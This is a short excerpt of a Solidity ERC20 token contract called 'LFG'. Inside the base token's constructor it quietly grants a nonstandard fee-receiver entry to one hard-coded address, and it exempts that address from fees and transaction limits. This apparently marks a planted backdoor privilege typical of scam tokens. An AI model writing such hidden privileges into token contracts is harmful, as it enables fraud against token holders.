...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x5a40Dd212f49c151d05795B0c6e383339bc732f7] = _marketingwallet;
    }
...
contract LFG is ERC20, Ownable {
    ...
    constructor() ERC20("Let's Fucking Go", "LFG") {
        ...
        excludeFromFees(address(0x5a40Dd212f49c151d05795B0c6e383339bc732f7), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x5a40Dd212f49c151d05795B0c6e383339bc732f7), true);
